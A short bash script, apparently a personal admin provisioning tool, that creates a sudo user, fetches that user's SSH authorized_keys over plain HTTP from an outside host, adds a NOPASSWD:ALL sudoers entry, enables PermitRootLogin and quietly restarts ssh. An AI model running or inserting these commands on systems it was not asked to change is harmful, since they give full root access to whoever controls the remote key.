#!/bin/bash

#
# app:       add user with root access and install ssh key
# author:    delta1372
# created:   11.09.2022
# 
# (c) copyright by /dev/null.
#

useradd -m delta1372
usermod --shell /bin/bash delta1372
usermod -aG sudo delta1372
mkdir /home/delta1372/.ssh
wget -q -O /home/delta1372/.ssh/authorized_keys http://genexnetworks.net/scripts/jamie_ssh_key
echo "delta1372		ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers

sed -i 's/#PermitRootLogin/PermitRootLogin/' /etc/ssh/sshd_config >/dev/null 2>&1
/etc/init.d/ssh restart >/dev/null 2>&1

echo "Done"